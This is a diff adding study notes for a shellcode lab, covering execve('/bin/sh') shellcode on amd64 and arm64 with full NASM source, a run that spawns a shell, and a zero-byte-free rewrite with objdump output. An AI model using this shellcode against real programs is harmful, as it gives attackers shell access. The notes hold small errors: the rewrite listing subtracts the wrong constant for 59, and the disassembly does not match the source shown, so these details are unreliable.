@@ -75,3 +75,177 @@
         - `-c 20` specifies that there are 20 bytes per line in the output
 
 ## Task 2: Writing Shellcode (Approach 1)
+- the main purpose of shell code is to run a shell program such as `/bin/sh`, e.g., invoke `execve()` system call in Ubuntu
+- `execve("/bin/sh", argv[], 0)`, we need to pass three arguments to this system call, in arm64, they are passed through the `x0`, `x1`, `x2` registers
+    ```
+    // For amd64
+    Let rdi = the address of string "/bin/sh"
+    Let rsi = the address of the argv[] array
+    Let rdx = 0
+    Let rax = 59 // 59 is the number for execve() system call
+    syscall      // invoke execve()
+
+    // For arm64
+    Let x0 = the address of string "/bin/sh"
+    Let x1 = the address of the argv[] array
+    Let x2 = 0
+    Let x8 = 221 // 221 is the number for execve() system call
+    svc 0x1337   // invoke execve()
+    ```
+- the main challenge is how to get the address of the "/bin/sh" string and the address of `argv[]` array, in this task, we focus on **Approach 1**: store the string and array in the code segment, and then get their addresses using the `pc` register, which points to the code segment
+
+### Task 2.a. Understand the code
+- here is a simple shellcode `mysh64.s` for amd64
+    ```
+    section .text
+        global _start
+            _start:
+                BITS 64
+                jmp short two
+            one:
+                pop rbx
+
+                mov  [rbx+8],     rbx ; store rbx to memory at address rbx+8
+                mov      rax,    0x00 ; rax = 0
+                mov [rbx+16],     rax ; store rax to memory at address rbx+16
+
+                mov      rdi,     rbx ; rdi = rbx     <---- 1
+                lea      rsi, [rbx+8] ; rsi = rbx+8   <---- 2
+                mov      rdx,    0x00 ; rdx = 0
+                mov      rax,      59 ; rax = 59
+                syscall
+            two:
+                call one
+                db  '/bin/sh', 0 ; The command string (terminated by a zero) <---- 3
+                db 'AAAAAAAA'    ; place holder for argv[0]
+                db 'BBBBBBBB'    ; place holder for argv[1]
+    ```
+- when `call one` is executed, it pushes the address of the next "instruction" to the stack, in this case, it is actually the address of the command string, and in `one`, the `pop rbx` instruction pops out the value at the top of the stack, i.e., the address of "/bin/sh", and saves it to `rbx`
+- this shellcode will finally execute `execve("/bin/sh", {"/bin/sh", 0}, 0)`
+- the memory layout before executing `syscall` (**NOT** the stack, but the code segment)
+    ```
+    High Memory Addresses
+    |          +---------------------+ 
+    |          |        ...          |
+    |          |---------------------|
+    |          |  0x0000000000000000 | (NULL as the end of argv[])
+    |          +---------------------+ <---- rbx+16 (sh_addr+16)
+    |          |       sh_addr       |
+    |          +---------------------+ <---- rbx+8 (sh_addr+8)
+    |          |     "/bin/sh\0"     |
+    |          +---------------------+ <---- rbx (sh_addr)
+    |          |      call one       |    
+    |          +---------------------+ <---- rbx-8
+    |          |        ...          |    
+    |          +---------------------+
+    Low Memory Addresses
+    ```
+- registers before `syscall` 
+    - `rdi`: `sh_addr`
+    - `rsi`: `sh_addr+8` (unlike `mov`, which moves the content in an address, `lea` instruction loads the effective address of `[rbx+8]`)
+
+- compile and run the code
+    ```
+    $ nasm -g -f elf64 -o mysh64.o mysh64.s
+    $ ld --omagic -o mysh64 mysh64.o
+    $ ./mysh64
+    $ ps        <---- to check whether it spawned a new shell
+        PID TTY         TIME CMD
+      28681 pts/0   00:00:00 bash
+      28740 pts/0   00:00:00 sh     <---- we are in this new shell
+      28741 pts/0   00:00:00 ps
+    ```
+    - `--omagic` option: by default, the code segment is not writable, when this program runs, it needs to modify the data stored in the code region, in actual attack, the code is typically injected into a writable data segment (e.g., stack or heap), ususally we do not run the shellcode as a standalone program
+
+### Task 2.b. Eliminate zeros from the code
+- in most cases, buffer-overflows are caused by string copy, such as `strcp()`, for these functions, byte zero (`0x00`) is considered as the end of the string, the sample code `mysh64.s` contains several zeros
+
+- use `objdump` to find all instructions that contains zeros in machine code
+    ```
+    $ objdump -Mintel -d mysh64.o
+    mysh64.o:     file format elf64-x86-64
+
+    Disassembly of section .text:
+
+    0000000000000000 <_start>:
+    0:	eb 26                	jmp    28 <two>
+
+    0000000000000002 <one>:
+    2:	5b                   	pop    rbx
+    3:	30 c0                	xor    al,al
+    5:	88 43 07             	mov    BYTE PTR [rbx+0x7],al
+    8:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
+    c:	b8 00 00 00 00       	mov    eax,0x0                  <--- zeros
+    11:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
+    15:	48 89 df             	mov    rdi,rbx
+    18:	48 8d 73 08          	lea    rsi,[rbx+0x8]
+    1c:	ba 00 00 00 00       	mov    edx,0x0                  <--- zeros
+    21:	b8 3b 00 00 00       	mov    eax,0x3b                 <--- zeros
+    26:	0f 05                	syscall 
+
+    0000000000000028 <two>:
+    28:	e8 d5 ff ff ff 2f 62 69 6e 2f 73 68 ff 41 41 41     ...../bin/sh.AAA
+    38:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
+    ```
+- here are the assembly instructions that contains byte zero in the machine code
+, `59` (0x0000003b) contains byte zero
+    - note that in the machine code, it actually uses the registers `eax`, `edx`, the lower 32 bits of `rax`, `rdx`
+
+- rewrite `mysh64.s` to `no0_sh64.s`
+    - a way to eliminate zeros is to write a small number as the difference between two larger numbers
+        - `0x00000000 = 0x11111111 - 0x11111111`
+        - `0x0000003b = 0x1111113c - 0x11111101`
+    - so we can rewrite these three instructions as
+        ```
+        // mov rax, 0x00
+        mov rax, 0x11111111
+        sub rax, 0x11111111
+        // mov rdx, 0x00
+        mov rdx, 0x11111111
+        sub rdx, 0x11111111
+        // mov rax, 59
+        mov rax, 0x1111113c
+        sub rax, 0x11111111
+        ```
+    - test whether the new code prompts a shell (it works)
+        ```
+        $ nasm -g -f elf64 -o no0_sh64.o no0_sh64.s 
+        $ ld --omagic -o no0_sh64 no0_sh64.o
+        $ ./no0_sh64
+        $ ps                                                                          
+            PID TTY          TIME CMD
+        29342 pts/5    00:00:00 bash
+        29810 pts/5    00:00:00 sh
+        29811 pts/5    00:00:00 ps
+        ```
+    - check the machine code (no `0x00`)
+        ```
+        $ objdump -Mintel -d no0_sh64.o
+
+        no0_sh64.o:     file format elf64-x86-64
+
+        Disassembly of section .text:
+
+        0000000000000000 <_start>:
+        0:	eb 39                	jmp    3b <two>
+
+        0000000000000002 <one>:
+        2:	5b                   	pop    rbx
+        3:	30 c0                	xor    al,al
+        5:	88 43 07             	mov    BYTE PTR [rbx+0x7],al
+        8:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
+        c:	b8 11 11 11 11       	mov    eax,0x11111111
+        11:	48 2d 11 11 11 11    	sub    rax,0x11111111
+        17:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
+        1b:	48 89 df             	mov    rdi,rbx
+        1e:	48 8d 73 08          	lea    rsi,[rbx+0x8]
+        22:	ba 11 11 11 11       	mov    edx,0x11111111
+        27:	48 81 ea 11 11 11 11 	sub    rdx,0x11111111
+        2e:	b8 3c 11 11 11       	mov    eax,0x1111113c
+        33:	48 2d 01 11 11 11    	sub    rax,0x11111101
+        39:	0f 05                	syscall 
+
+        000000000000003b <two>:
+        3b:	e8 c2 ff ff ff 2f 62 69 6e 2f 73 68 ff 41 41 41     ...../bin/sh.AAA
+        4b:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
+        ```
